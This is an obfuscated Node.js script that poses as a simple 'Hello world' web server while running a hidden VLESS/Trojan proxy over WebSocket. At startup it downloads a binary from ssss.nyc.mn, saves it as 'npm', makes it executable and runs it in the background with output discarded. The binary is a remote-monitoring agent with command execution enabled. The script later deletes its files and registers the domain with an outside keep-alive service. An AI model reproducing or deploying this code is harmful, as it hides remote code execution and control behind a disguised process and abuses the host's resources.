const _0x57a35c=_0x1505;(function(_0x4e5551,_0x2a011c){const _0xc528e9=_0x1505,_0x2b6d2a=_0x4e5551();while(!![]){try{const _0x29e91d=parseInt(_0xc528e9(0x186))/0x1+parseInt(_0xc528e9(0x1a1))/0x2+-parseInt(_0xc528e9(0x195))/0x3*(-parseInt(_0xc528e9(0x1a3))/0x4)+-parseInt(_0xc528e9(0x1b6))/0x5+-parseInt(_0xc528e9(0x170))/0x6*(-parseInt(_0xc528e9(0x17a))/0x7)+parseInt(_0xc528e9(0x171))/0x8+-parseInt(_0xc528e9(0x185))/0x9;if(_0x29e91d===_0x2a011c)break;else _0x2b6d2a['push'](_0x2b6d2a['shift']());}catch(_0x534c7a){_0x2b6d2a['push'](_0x2b6d2a['shift']());}}}(_0x56dd,0x19d0f));const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0x57a35c(0x14e)),net=require(_0x57a35c(0x1bc)),path=require(_0x57a35c(0x14c)),crypto=require('crypto'),{Buffer}=require(_0x57a35c(0x1a4)),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x57a35c(0x198)]['UUID']||_0x57a35c(0x14a),NEZHA_SERVER=process[_0x57a35c(0x198)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x57a35c(0x198)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x57a35c(0x198)][_0x57a35c(0x16e)]||'',DOMAIN=process['env'][_0x57a35c(0x1bb)]||'1234.abc.com',AUTO_ACCESS=process['env']['AUTO_ACCESS']||!![],WSPATH=process[_0x57a35c(0x198)][_0x57a35c(0x14b)]||UUID[_0x57a35c(0x1ae)](0x0,0x8),SUB_PATH=process['env'][_0x57a35c(0x172)]||_0x57a35c(0x178),NAME=process[_0x57a35c(0x198)][_0x57a35c(0x177)]||'',PORT=process[_0x57a35c(0x198)][_0x57a35c(0x150)]||0x1eb4;let ISP='';function _0x1505(_0x5c1df0,_0x27be3c){const _0x56dd5a=_0x56dd();return _0x1505=function(_0x150538,_0x1ee6cc){_0x150538=_0x150538-0x146;let _0x158a25=_0x56dd5a[_0x150538];return _0x158a25;},_0x1505(_0x5c1df0,_0x27be3c);}const GetISP=async()=>{const _0x3d52c0=_0x57a35c;try{const _0x126409=await axios[_0x3d52c0(0x164)](_0x3d52c0(0x168)),_0x54f9d8=_0x126409[_0x3d52c0(0x163)];ISP=(_0x54f9d8[_0x3d52c0(0x152)]+'-'+_0x54f9d8[_0x3d52c0(0x175)])[_0x3d52c0(0x157)](/ /g,'_');}catch(_0x4c1451){ISP=_0x3d52c0(0x16c);}};function _0x56dd(){const _0x15dfae=['Unknown','substr','NEZHA_KEY','then','6EUFLPp','651752AzsCXa','SUB_PATH','url','readUInt16BE','isp','https://amd64.ssss.nyc.mn/v1','NAME','sub','\x20with\x20all\x20DNS\x20servers','1161755euxfzr','Answer','find','test','every','writeHead','from','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','\x20-p\x20','chmod\x20+x\x20npm','2096','3252447RzLzst','210632NEtClu','trojan://','false','Not\x20Found\x0a','catch','application/json','2087','2053','concat','utf8','setsid\x20nohup\x20./npm\x20-s\x20','connect','reduce','8.8.4.4','send','6NTVJbC','map','write','env','Hello\x20world!','trim','&path=%2F','&type=A','aarch64','error','createWriteStream','index.html','236756wNXZQe','npm','186968WhlWuc','buffer','https://arm64.ssss.nyc.mn/agent','createServer','split','digest','pop','2083','type','vless://','Server\x20is\x20running\x20on\x20port\x20','slice','post','hex','log','toString','join','npm\x20is\x20already\x20running,\x20skip\x20running...','update','1014010KGJMtj','error:\x20',':443?encryption=none&security=tls&sni=','arm64','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','DOMAIN','net','npm\x20download\x20successfully','once','writeFileSync','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','text/plain','ba48dfa7-8fdb-42d7-a539-f33d66e5e157','WSPATH','path','sha224','axios','text/html','PORT','arch','country_code','true','client_secret:\x20','npm\x20running\x20error:','createHash','replace','&fp=chrome&type=ws&host=','includes','finish','listen','connection','--tls','https://arm64.ssss.nyc.mn/v1','config.yaml','1.1.1.1','base64','end','data','get','arm','decode','stream','https://api.ip.sb/geoip','readUInt8','length','pipe'];_0x56dd=function(){return _0x15dfae;};return _0x56dd();}GetISP();const httpServer=http[_0x57a35c(0x1a6)]((_0x29cabf,_0x800fdc)=>{const _0x3d7a88=_0x57a35c;if(_0x29cabf[_0x3d7a88(0x173)]==='/'){const _0x36c711=path[_0x3d7a88(0x1b3)](__dirname,_0x3d7a88(0x1a0));fs['readFile'](_0x36c711,_0x3d7a88(0x18f),(_0x11d1c0,_0x3ce8bb)=>{const _0x59f715=_0x3d7a88;if(_0x11d1c0){_0x800fdc[_0x59f715(0x17f)](0xc8,{'Content-Type':'text/html'}),_0x800fdc['end'](_0x59f715(0x199));return;}_0x800fdc[_0x59f715(0x17f)](0xc8,{'Content-Type':_0x59f715(0x14f)}),_0x800fdc[_0x59f715(0x162)](_0x3ce8bb);});return;}else{if(_0x29cabf[_0x3d7a88(0x173)]==='/'+SUB_PATH){const _0x443b8a=NAME?NAME+'-'+ISP:ISP,_0x4cd1a2=_0x3d7a88(0x1ac)+UUID+'@'+DOMAIN+_0x3d7a88(0x1b8)+DOMAIN+_0x3d7a88(0x158)+DOMAIN+_0x3d7a88(0x19b)+WSPATH+'#'+_0x443b8a,_0x5363bc=_0x3d7a88(0x187)+UUID+'@'+DOMAIN+':443?security=tls&sni='+DOMAIN+_0x3d7a88(0x158)+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x443b8a,_0x224ff1=_0x4cd1a2+'\x0a'+_0x5363bc,_0x216d6b=Buffer[_0x3d7a88(0x180)](_0x224ff1)[_0x3d7a88(0x1b2)](_0x3d7a88(0x161));_0x800fdc[_0x3d7a88(0x17f)](0xc8,{'Content-Type':_0x3d7a88(0x149)}),_0x800fdc[_0x3d7a88(0x162)](_0x216d6b+'\x0a');}else _0x800fdc[_0x3d7a88(0x17f)](0x194,{'Content-Type':'text/plain'}),_0x800fdc[_0x3d7a88(0x162)](_0x3d7a88(0x189));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x57a35c(0x157)](/-/g,''),DNS_SERVERS=[_0x57a35c(0x193),_0x57a35c(0x160)];function resolveHost(_0x34e8fb){return new Promise((_0x576189,_0x117fe1)=>{const _0x48fdb0=_0x1505;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x48fdb0(0x17d)](_0x34e8fb)){_0x576189(_0x34e8fb);return;}let _0x569051=0x0;function _0x49f3a4(){const _0x614521=_0x48fdb0;if(_0x569051>=DNS_SERVERS[_0x614521(0x16a)]){_0x117fe1(new Error('Failed\x20to\x20resolve\x20'+_0x34e8fb+_0x614521(0x179)));return;}const _0x3547fb=DNS_SERVERS[_0x569051];_0x569051++;const _0x5e6212='https://dns.google/resolve?name='+encodeURIComponent(_0x34e8fb)+_0x614521(0x19c);axios[_0x614521(0x164)](_0x5e6212,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})['then'](_0x859225=>{const _0xe2077c=_0x614521,_0x2c1a9c=_0x859225['data'];if(_0x2c1a9c['Status']===0x0&&_0x2c1a9c['Answer']&&_0x2c1a9c['Answer']['length']>0x0){const _0xbaa76d=_0x2c1a9c[_0xe2077c(0x17b)][_0xe2077c(0x17c)](_0xcc60e2=>_0xcc60e2[_0xe2077c(0x1ab)]===0x1);if(_0xbaa76d){_0x576189(_0xbaa76d[_0xe2077c(0x163)]);return;}}_0x49f3a4();})['catch'](_0x2f3917=>{_0x49f3a4();});}_0x49f3a4();});}function handleVlessConnection(_0x282c3a,_0x23d252){const _0x2059b8=_0x57a35c,[_0xd2641]=_0x23d252,_0x42118d=_0x23d252['slice'](0x1,0x11);if(!_0x42118d[_0x2059b8(0x17e)]((_0x4c2313,_0x847fbc)=>_0x4c2313==parseInt(uuid[_0x2059b8(0x16d)](_0x847fbc*0x2,0x2),0x10)))return![];let _0x4ae827=_0x23d252[_0x2059b8(0x1ae)](0x11,0x12)[_0x2059b8(0x169)]()+0x13;const _0x1bbc54=_0x23d252[_0x2059b8(0x1ae)](_0x4ae827,_0x4ae827+=0x2)[_0x2059b8(0x174)](0x0),_0x7fc028=_0x23d252[_0x2059b8(0x1ae)](_0x4ae827,_0x4ae827+=0x1)[_0x2059b8(0x169)](),_0x52ead9=_0x7fc028==0x1?_0x23d252[_0x2059b8(0x1ae)](_0x4ae827,_0x4ae827+=0x4)[_0x2059b8(0x1b3)]('.'):_0x7fc028==0x2?new TextDecoder()[_0x2059b8(0x166)](_0x23d252[_0x2059b8(0x1ae)](_0x4ae827+0x1,_0x4ae827+=0x1+_0x23d252[_0x2059b8(0x1ae)](_0x4ae827,_0x4ae827+0x1)[_0x2059b8(0x169)]())):_0x7fc028==0x3?_0x23d252[_0x2059b8(0x1ae)](_0x4ae827,_0x4ae827+=0x10)['reduce']((_0x1bc725,_0x2cad00,_0x525a95,_0x55c63f)=>_0x525a95%0x2?_0x1bc725['concat'](_0x55c63f[_0x2059b8(0x1ae)](_0x525a95-0x1,_0x525a95+0x1)):_0x1bc725,[])[_0x2059b8(0x196)](_0x1dc6db=>_0x1dc6db[_0x2059b8(0x174)](0x0)[_0x2059b8(0x1b2)](0x10))[_0x2059b8(0x1b3)](':'):'';_0x282c3a[_0x2059b8(0x194)](new Uint8Array([_0xd2641,0x0]));const _0x5032db=createWebSocketStream(_0x282c3a);return resolveHost(_0x52ead9)['then'](_0x4ade1b=>{const _0x44b66b=_0x2059b8;net[_0x44b66b(0x191)]({'host':_0x4ade1b,'port':_0x1bbc54},function(){const _0x507fa9=_0x44b66b;this[_0x507fa9(0x197)](_0x23d252['slice'](_0x4ae827)),_0x5032db['on'](_0x507fa9(0x19e),()=>{})[_0x507fa9(0x16b)](this)['on'](_0x507fa9(0x19e),()=>{})[_0x507fa9(0x16b)](_0x5032db);})['on'](_0x44b66b(0x19e),()=>{});})[_0x2059b8(0x18a)](_0x4ff2c1=>{const _0x254251=_0x2059b8;net[_0x254251(0x191)]({'host':_0x52ead9,'port':_0x1bbc54},function(){const _0x4f4d7d=_0x254251;this[_0x4f4d7d(0x197)](_0x23d252[_0x4f4d7d(0x1ae)](_0x4ae827)),_0x5032db['on'](_0x4f4d7d(0x19e),()=>{})[_0x4f4d7d(0x16b)](this)['on'](_0x4f4d7d(0x19e),()=>{})[_0x4f4d7d(0x16b)](_0x5032db);})['on'](_0x254251(0x19e),()=>{});}),!![];}function handleTrojanConnection(_0x455bd3,_0x3275b8){const _0x500acf=_0x57a35c;try{if(_0x3275b8['length']<0x3a)return![];const _0x57fe1a=_0x3275b8[_0x500acf(0x1ae)](0x0,0x38)[_0x500acf(0x1b2)](),_0x25c0d1=[UUID];let _0x2797be=null;for(const _0x4bfbf0 of _0x25c0d1){const _0x5f3ddc=crypto[_0x500acf(0x156)](_0x500acf(0x14d))[_0x500acf(0x1b5)](_0x4bfbf0)[_0x500acf(0x1a8)](_0x500acf(0x1b0));if(_0x5f3ddc===_0x57fe1a){_0x2797be=_0x4bfbf0;break;}}if(!_0x2797be)return![];let _0x2ca814=0x38;_0x3275b8[_0x2ca814]===0xd&&_0x3275b8[_0x2ca814+0x1]===0xa&&(_0x2ca814+=0x2);const _0x159a47=_0x3275b8[_0x2ca814];if(_0x159a47!==0x1)return![];_0x2ca814+=0x1;const _0x51c7cf=_0x3275b8[_0x2ca814];_0x2ca814+=0x1;let _0xc562fa,_0x1931c8;if(_0x51c7cf===0x1)_0xc562fa=_0x3275b8[_0x500acf(0x1ae)](_0x2ca814,_0x2ca814+0x4)[_0x500acf(0x1b3)]('.'),_0x2ca814+=0x4;else{if(_0x51c7cf===0x3){const _0x6f4313=_0x3275b8[_0x2ca814];_0x2ca814+=0x1,_0xc562fa=_0x3275b8[_0x500acf(0x1ae)](_0x2ca814,_0x2ca814+_0x6f4313)['toString'](),_0x2ca814+=_0x6f4313;}else{if(_0x51c7cf===0x4)_0xc562fa=_0x3275b8[_0x500acf(0x1ae)](_0x2ca814,_0x2ca814+0x10)[_0x500acf(0x192)]((_0x582da5,_0x315ccd,_0x5b6b70,_0x770390)=>_0x5b6b70%0x2?_0x582da5[_0x500acf(0x18e)](_0x770390[_0x500acf(0x1ae)](_0x5b6b70-0x1,_0x5b6b70+0x1)):_0x582da5,[])[_0x500acf(0x196)](_0x5e901a=>_0x5e901a[_0x500acf(0x174)](0x0)[_0x500acf(0x1b2)](0x10))[_0x500acf(0x1b3)](':'),_0x2ca814+=0x10;else return![];}}_0x1931c8=_0x3275b8['readUInt16BE'](_0x2ca814),_0x2ca814+=0x2;_0x2ca814<_0x3275b8[_0x500acf(0x16a)]&&_0x3275b8[_0x2ca814]===0xd&&_0x3275b8[_0x2ca814+0x1]===0xa&&(_0x2ca814+=0x2);const _0x281b6e=createWebSocketStream(_0x455bd3);return resolveHost(_0xc562fa)[_0x500acf(0x16f)](_0x4d2504=>{const _0x396a58=_0x500acf;net[_0x396a58(0x191)]({'host':_0x4d2504,'port':_0x1931c8},function(){const _0x4ea1d4=_0x396a58;_0x2ca814<_0x3275b8['length']&&this[_0x4ea1d4(0x197)](_0x3275b8['slice'](_0x2ca814)),_0x281b6e['on'](_0x4ea1d4(0x19e),()=>{})[_0x4ea1d4(0x16b)](this)['on'](_0x4ea1d4(0x19e),()=>{})[_0x4ea1d4(0x16b)](_0x281b6e);})['on']('error',()=>{});})[_0x500acf(0x18a)](_0x464379=>{const _0x5d0b83=_0x500acf;net[_0x5d0b83(0x191)]({'host':_0xc562fa,'port':_0x1931c8},function(){const _0x1301dc=_0x5d0b83;_0x2ca814<_0x3275b8['length']&&this['write'](_0x3275b8[_0x1301dc(0x1ae)](_0x2ca814)),_0x281b6e['on'](_0x1301dc(0x19e),()=>{})[_0x1301dc(0x16b)](this)['on']('error',()=>{})[_0x1301dc(0x16b)](_0x281b6e);})['on']('error',()=>{});}),!![];}catch(_0x1691e9){return![];}}wss['on'](_0x57a35c(0x15c),(_0x3f4b31,_0x3672b6)=>{const _0x5f44b4=_0x57a35c,_0x10e102=_0x3672b6[_0x5f44b4(0x173)]||'';_0x3f4b31[_0x5f44b4(0x146)]('message',_0x529d05=>{const _0x33e50d=_0x5f44b4;if(_0x529d05[_0x33e50d(0x16a)]>0x11&&_0x529d05[0x0]===0x0){const _0x2556a4=_0x529d05[_0x33e50d(0x1ae)](0x1,0x11),_0x253ac9=_0x2556a4[_0x33e50d(0x17e)]((_0x9519a3,_0x257f1f)=>_0x9519a3==parseInt(uuid[_0x33e50d(0x16d)](_0x257f1f*0x2,0x2),0x10));if(_0x253ac9){!handleVlessConnection(_0x3f4b31,_0x529d05)&&_0x3f4b31['close']();return;}}!handleTrojanConnection(_0x3f4b31,_0x529d05)&&_0x3f4b31['close']();})['on'](_0x5f44b4(0x19e),()=>{});});const getDownloadUrl=()=>{const _0x4e7b45=_0x57a35c,_0x126294=os[_0x4e7b45(0x151)]();return _0x126294===_0x4e7b45(0x165)||_0x126294===_0x4e7b45(0x1b9)||_0x126294===_0x4e7b45(0x19d)?!NEZHA_PORT?_0x4e7b45(0x15e):_0x4e7b45(0x1a5):!NEZHA_PORT?_0x4e7b45(0x176):'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x5635e7=_0x57a35c;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x1d8b20=getDownloadUrl(),_0x1d3941=await axios({'method':_0x5635e7(0x164),'url':_0x1d8b20,'responseType':_0x5635e7(0x167)}),_0xbee52d=fs[_0x5635e7(0x19f)](_0x5635e7(0x1a2));return _0x1d3941[_0x5635e7(0x163)][_0x5635e7(0x16b)](_0xbee52d),new Promise((_0x7eb326,_0x5db904)=>{const _0x5b98f1=_0x5635e7;_0xbee52d['on'](_0x5b98f1(0x15a),()=>{const _0x13c791=_0x5b98f1;console[_0x13c791(0x1b1)](_0x13c791(0x1bd)),exec(_0x13c791(0x183),_0x582b3d=>{if(_0x582b3d)_0x5db904(_0x582b3d);_0x7eb326();});}),_0xbee52d['on'](_0x5b98f1(0x19e),_0x5db904);});}catch(_0x203fc6){throw _0x203fc6;}},runnz=async()=>{const _0x3b5ed6=_0x57a35c;try{const _0x222f32=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':'utf-8'});if(_0x222f32[_0x3b5ed6(0x19a)]()!==''){console['log'](_0x3b5ed6(0x1b4));return;}}catch(_0x4257f3){}await downloadFile();let _0x597381='',_0x33010b=['443','8443',_0x3b5ed6(0x184),_0x3b5ed6(0x18c),_0x3b5ed6(0x1aa),_0x3b5ed6(0x18d)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x551991=_0x33010b['includes'](NEZHA_PORT)?_0x3b5ed6(0x15d):'';_0x597381=_0x3b5ed6(0x190)+NEZHA_SERVER+':'+NEZHA_PORT+_0x3b5ed6(0x182)+NEZHA_KEY+'\x20'+_0x551991+_0x3b5ed6(0x148);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x38d178=NEZHA_SERVER[_0x3b5ed6(0x159)](':')?NEZHA_SERVER[_0x3b5ed6(0x1a7)](':')[_0x3b5ed6(0x1a9)]():'',_0x1d1842=_0x33010b['includes'](_0x38d178)?_0x3b5ed6(0x153):_0x3b5ed6(0x188),_0x4af0e6=_0x3b5ed6(0x154)+NEZHA_KEY+_0x3b5ed6(0x1ba)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x1d1842+_0x3b5ed6(0x181)+UUID;fs[_0x3b5ed6(0x147)](_0x3b5ed6(0x15f),_0x4af0e6);}_0x597381='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console['log']('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x597381,{'shell':'/bin/bash'},_0x1f8dab=>{const _0x443edf=_0x3b5ed6;if(_0x1f8dab)console['error'](_0x443edf(0x155),_0x1f8dab);else console[_0x443edf(0x1b1)]('npm\x20is\x20running');});}catch(_0x482df7){console['error'](_0x3b5ed6(0x1b7)+_0x482df7);}};async function addAccessTask(){const _0x2ad7a8=_0x57a35c;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x5d3262='https://'+DOMAIN;try{const _0x360355=await axios[_0x2ad7a8(0x1af)]('https://oooo.serv00.net/add-url',{'url':_0x5d3262},{'headers':{'Content-Type':_0x2ad7a8(0x18b)}});console[_0x2ad7a8(0x1b1)]('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x32931b){}}const delFiles=()=>{const _0x6beaeb=_0x57a35c;fs['unlink']('npm',()=>{}),fs['unlink'](_0x6beaeb(0x15f),()=>{});};httpServer[_0x57a35c(0x15b)](PORT,()=>{const _0x44571a=_0x57a35c;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x44571a(0x1ad)+PORT);});
